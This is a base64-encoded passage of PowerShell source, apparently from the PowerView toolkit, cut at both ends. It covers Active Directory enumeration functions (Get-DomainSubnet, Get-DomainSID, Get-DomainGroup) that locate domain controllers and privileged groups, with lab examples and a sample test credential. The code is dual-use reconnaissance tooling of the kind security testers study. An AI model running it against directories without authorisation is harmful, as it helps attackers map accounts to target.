7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeQ049LionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKC1Kb2luICgoW0d1aWRdJElkZW50aXR5SW5zdGFuY2UpLlRvQnl0ZUFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JF8uVG9TdHJpbmcoJ1gnKS5QYWRMZWZ0KDIsJzAnKX0pKSAtUmVwbGFjZSAnKC4uKScsJ1wkMScKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZpbHRlci5UcmltKCkgLW5lICcnKSApIHsKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIih8JElkZW50aXR5RmlsdGVyKSIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblN1Ym5ldF0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFN1Ym5ldFNlYXJjaGVyLmZpbHRlciA9ICIoJihvYmplY3RDYXRlZ29yeT1zdWJuZXQpJEZpbHRlcikiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU3VibmV0XSBHZXQtRG9tYWluU3VibmV0IGZpbHRlciBzdHJpbmc6ICQoJFN1Ym5ldFNlYXJjaGVyLmZpbHRlcikiCgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkU3VibmV0U2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJFN1Ym5ldFNlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSYXcnXSkgewogICAgICAgICAgICAgICAgICAgICMgcmV0dXJuIHJhdyByZXN1bHQgb2JqZWN0cwogICAgICAgICAgICAgICAgICAgICRTdWJuZXQgPSAkXwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJFN1Ym5ldCA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRTdWJuZXQuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlN1Ym5ldCcpCgogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2l0ZU5hbWUnXSkgewogICAgICAgICAgICAgICAgICAgICMgaGF2ZSB0byBkbyB0aGUgZmlsdGVyaW5nIGFmdGVyIHRoZSBMREFQIHF1ZXJ5IGFzIExEQVAgZG9lc24ndCBsZXQgeW91IHNwZWNpZnkKICAgICAgICAgICAgICAgICAgICAjICAgd2lsZGNhcmRzIGZvciAnc2l0ZW9iamVjdCcgOigKICAgICAgICAgICAgICAgICAgICBpZiAoJFN1Ym5ldC5wcm9wZXJ0aWVzIC1hbmQgKCRTdWJuZXQucHJvcGVydGllcy5zaXRlb2JqZWN0IC1saWtlICIqJFNpdGVOYW1lKiIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTdWJuZXQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkU3VibmV0LnNpdGVvYmplY3QgLWxpa2UgIiokU2l0ZU5hbWUqIikgewogICAgICAgICAgICAgICAgICAgICAgICAkU3VibmV0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJFN1Ym5ldAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblN1Ym5ldF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFN1Ym5ldFNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5TSUQgewo8IwouU1lOT1BTSVMKClJldHVybnMgdGhlIFNJRCBmb3IgdGhlIGN1cnJlbnQgZG9tYWluIG9yIHRoZSBzcGVjaWZpZWQgZG9tYWluLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluQ29tcHV0ZXIgIAoKLkRFU0NSSVBUSU9OCgpSZXR1cm5zIHRoZSBTSUQgZm9yIHRoZSBjdXJyZW50IGRvbWFpbiBvciB0aGUgc3BlY2lmaWVkIGRvbWFpbiBieSBleGVjdXRpbmcKR2V0LURvbWFpbkNvbXB1dGVyIHdpdGggdGhlIC1MREFQRmlsdGVyIHNldCB0byAodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTgxOTIpCnRvIHNlYXJjaCBmb3IgZG9tYWluIGNvbnRyb2xsZXJzIHRocm91Z2ggTERBUC4gVGhlIFNJRCBvZiB0aGUgcmV0dXJuZWQgZG9tYWluIGNvbnRyb2xsZXIKaXMgdGhlbiBleHRyYWN0ZWQuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5TSUQKCi5FWEFNUExFCgpHZXQtRG9tYWluU0lEIC1Eb21haW4gdGVzdGxhYi5sb2NhbAoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5TSUQgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpTdHJpbmcKCkEgc3RyaW5nIHJlcHJlc2VudGluZyB0aGUgc3BlY2lmaWVkIGRvbWFpbiBTSUQuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKFtTdHJpbmddKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgJ0xEQVBGaWx0ZXInID0gJyh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9ODE5MiknCiAgICB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgJERDU0lEID0gR2V0LURvbWFpbkNvbXB1dGVyIEBTZWFyY2hlckFyZ3VtZW50cyAtRmluZE9uZSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IG9iamVjdHNpZAoKICAgIGlmICgkRENTSUQpIHsKICAgICAgICAkRENTSUQuU3ViU3RyaW5nKDAsICREQ1NJRC5MYXN0SW5kZXhPZignLScpKQogICAgfQogICAgZWxzZSB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TSURdIEVycm9yIGV4dHJhY3RpbmcgZG9tYWluIFNJRCBmb3IgJyREb21haW4nIgogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbkdyb3VwIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm4gYWxsIGdyb3VwcyBvciBzcGVjaWZpYyBncm91cCBvYmplY3RzIGluIEFELgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIsIEdldC1Eb21haW5PYmplY3QsIENvbnZlcnQtQUROYW1lLCBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAgCgouREVTQ1JJUFRJT04KCkJ1aWxkcyBhIGRpcmVjdG9yeSBzZWFyY2hlciBvYmplY3QgdXNpbmcgR2V0LURvbWFpblNlYXJjaGVyLCBidWlsZHMgYSBjdXN0b20KTERBUCBmaWx0ZXIgYmFzZWQgb24gdGFyZ2V0aW5nL2ZpbHRlciBwYXJhbWV0ZXJzLCBhbmQgc2VhcmNoZXMgZm9yIGFsbCBvYmplY3RzCm1hdGNoaW5nIHRoZSBjcml0ZXJpYS4gVG8gb25seSByZXR1cm4gc3BlY2lmaWMgcHJvcGVydGllcywgdXNlCiItUHJvcGVydGllcyBzYW1hY2NvdW50bmFtZSx1c25jaGFuZ2VkLC4uLiIuIEJ5IGRlZmF1bHQsIGFsbCBncm91cCBvYmplY3RzIGZvcgp0aGUgY3VycmVudCBkb21haW4gYXJlIHJldHVybmVkLiBUbyByZXR1cm4gdGhlIGdyb3VwcyBhIHNwZWNpZmljIHVzZXIvZ3JvdXAgaXMKYSBwYXJ0IG9mLCB1c2UgLU1lbWJlcklkZW50aXR5IFggdG8gZXhlY3V0ZSB0b2tlbiBncm91cHMgZW51bWVyYXRpb24uCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIEdyb3VwMSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWdyb3VwMSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExNCksIG9yIEdVSUQgKGUuZy4gNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBkMjAyKQpzcGVjaWZ5aW5nIHRoZSBncm91cCB0byBxdWVyeSBmb3IuIFdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgTWVtYmVySWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gR3JvdXAxKSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049Z3JvdXAxLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTE0KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDIpCnNwZWNpZnlpbmcgdGhlIHVzZXIvZ3JvdXAgbWVtYmVyIHRvIHF1ZXJ5IGZvciBncm91cCBtZW1iZXJzaGlwLgoKLlBBUkFNRVRFUiBBZG1pbkNvdW50CgpTd2l0Y2guIFJldHVybiB1c2VycyB3aXRoICcoYWRtaW5Db3VudD0xKScgKG1lYW5pbmcgYXJlL3dlcmUgcHJpdmlsZWdlZCkuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpTcGVjaWZpZXMgdGhlIHByb3BlcnRpZXMgb2YgdGhlIG91dHB1dCBvYmplY3QgdG8gcmV0cmlldmUgZnJvbSB0aGUgc2VydmVyLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBTZWN1cml0eU1hc2tzCgpTcGVjaWZpZXMgYW4gb3B0aW9uIGZvciBleGFtaW5pbmcgc2VjdXJpdHkgaW5mb3JtYXRpb24gb2YgYSBkaXJlY3Rvcnkgb2JqZWN0LgpPbmUgb2YgJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIEZpbmRPbmUKCk9ubHkgcmV0dXJuIG9uZSByZXN1bHQgb2JqZWN0LgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLlBBUkFNRVRFUiBSYXcKClN3aXRjaC4gUmV0dXJuIHJhdyByZXN1bHRzIGluc3RlYWQgb2YgdHJhbnNsYXRpbmcgdGhlIGZpZWxkcyBpbnRvIGEgY3VzdG9tIFBTT2JqZWN0LgoKLkVYQU1QTEUKCkdldC1Eb21haW5Hcm91cCB8IHNlbGVjdCBzYW1hY2NvdW50bmFtZQoKc2FtYWNjb3VudG5hbWUKLS0tLS0tLS0tLS0tLS0KV2luUk1SZW1vdGVXTUlVc2Vyc19fCkFkbWluaXN0cmF0b3JzClVzZXJzCkd1ZXN0cwpQcmludCBPcGVyYXRvcnMKQmFja3VwIE9wZXJhdG9ycwouLi4KCi5FWEFNUExFCgpHZXQtRG9tYWluR3JvdXAgKmFkbWluKiB8IHNlbGVjdCBkaXN0aW5ndWlzaGVkbmFtZQoKZGlzdGluZ3Vpc2hlZG5hbWUKLS0tLS0tLS0tLS0tLS0tLS0KQ049QWRtaW5pc3RyYXRvcnMsQ049QnVpbHRpbixEQz10ZXN0bGFiLERDPWxvY2FsCkNOPUh5cGVyLVYgQWRtaW5pc3RyYXRvcnMsQ049QnVpbHRpbixEQz10ZXN0bGFiLERDPWxvY2FsCkNOPVNjaGVtYSBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApDTj1FbnRlcnByaXNlIEFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCkNOPURvbWFpbiBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApDTj1EbnNBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApDTj1TZXJ2ZXIgQWRtaW5zLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKQ049RGVza3RvcCBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbAoKLkVYQU1QTEUKCkdldC1Eb21haW5Hcm91cCAtUHJvcGVydGllcyBzYW1hY2NvdW50bmFtZSAtSWRlbnRpdHkgJ1MtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExNycgfCBmbAoKc2FtYWNjb3VudG5hbWUKLS0tLS0tLS0tLS0tLS0KU2VydmVyIEFkbWlucwoKLkVYQU1QTEUKCidDTj1EZXNrdG9wIEFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsJyB8IEdldC1Eb21haW5Hcm91cCAtU2VydmVyIHByaW1hcnkudGVzdGxhYi5sb2NhbCAtVmVyYm9zZQpWRVJCT1NFOiBHZXQtRG9tYWluU2VhcmNoZXIgc2VhcmNoIHN0cmluZzogTERBUDovL0RDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogR2V0LURvbWFpbkdyb3VwIGZpbHRlciBzdHJpbmc6ICgmKG9iamVjdENhdGVnb3J5PWdyb3VwKSh8KGRpc3Rpbmd1aXNoZWRuYW1lPUNOPURlc2t0b3BBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCkpKQoKdXNuY3JlYXRlZCAgICAgICAgICAgIDogMTMyNDUKZ3JvdXB0eXBlICAgICAgICAgICAgIDogLTIxNDc0ODM2NDYKc2FtYWNjb3VudHR5cGUgICAgICAgIDogMjY4NDM1NDU2CnNhbWFjY291bnRuYW1lICAgICAgICA6IERlc2t0b3AgQWRtaW5zCndoZW5jaGFuZ2VkICAgICAgICAgICA6IDgvMTAvMjAxNiAxMjozMDozMCBBTQpvYmplY3RzaWQgICAgICAgICAgICAgOiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTgKb2JqZWN0Y2xhc3MgICAgICAgICAgIDoge3RvcCwgZ3JvdXB9CmNuICAgICAgICAgICAgICAgICAgICA6IERlc2t0b3AgQWRtaW5zCnVzbmNoYW5nZWQgICAgICAgICAgICA6IDEzMjU1CmRzY29yZXByb3BhZ2F0aW9uZGF0YSA6IDEvMS8xNjAxIDEyOjAwOjAwIEFNCm5hbWUgICAgICAgICAgICAgICAgICA6IERlc2t0b3AgQWRtaW5zCmRpc3Rpbmd1aXNoZWRuYW1lICAgICA6IENOPURlc2t0b3AgQWRtaW5zLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKbWVtYmVyICAgICAgICAgICAgICAgIDogQ049QW5keSBSb2JiaW5zIChhZG1pbiksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbAp3aGVuY3JlYXRlZCAgICAgICAgICAgOiA4LzEwLzIwMTYgMTI6Mjk6NDMgQU0KaW5zdGFuY2V0eXBlICAgICAgICAgIDogNApvYmplY3RndWlkICAgICAgICAgICAgOiBmMzc5MDNlZC1iMzMzLTQ5ZjQtYWJhYS00NmM2NWU5Y2NhNzEKb2JqZWN0Y2F0ZWdvcnkgICAgICAgIDogQ049R3JvdXAsQ049U2NoZW1hLENOPUNvbmZpZ3VyYXRpb24sREM9dGVzdGxhYixEQz1sb2NhbAoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5Hcm91cCAtQ3JlZGVudGlhbCAkQ3JlZAoKLkVYQU1QTEUKCkdldC1Eb21haW4gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmQgbmFtZQp0ZXN0bGFiLmxvY2FsCgonREVWXERvbWFpbiBBZG1pbnMnIHwgR2V0LURvbWFpbkdyb3VwIC1WZXJib3NlIC1Qcm9wZXJ0aWVzIGRpc3Rpbmd1aXNoZWRuYW1lClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpbkdyb3VwXSBFeHRyYWN0ZWQgZG9tYWluICdkZXYudGVzdGxhYi5sb2NhbCcgZnJvbSAnREVWXERvbWFpbiBBZG1pbnMnClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5Hcm91cF0gZmlsdGVyIHN0cmluZzogKCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApKHwoc2FtQWNjb3VudE5hbWU9RG9tYWluIEFkbWlucykpKQoKZGlzdGluZ3Vpc2hlZG5hbWUKLS0tLS0tLS0tLS0tLS0tLS0KQ049RG9tYWluIEFkbWlucyxDTj1Vc2VycyxEQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbAoKLk9VVFBVVFMKClBvd2VyVmlldy5Hcm91cAoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBncm91cCBwcm9wZXJ0eSBmaWVsZHMuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZURlY2xhcmVkVmFyc01vcmVUaGFuQXNzaWdubWVudHMnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lkdyb3VwJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdBbGxvd0RlbGVnYXRpb24nKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScsICdNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZScsICdNZW1iZXJOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1VzZXJOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTWVtYmVySWRlbnRpdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEFkbWluQ291bnQsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclR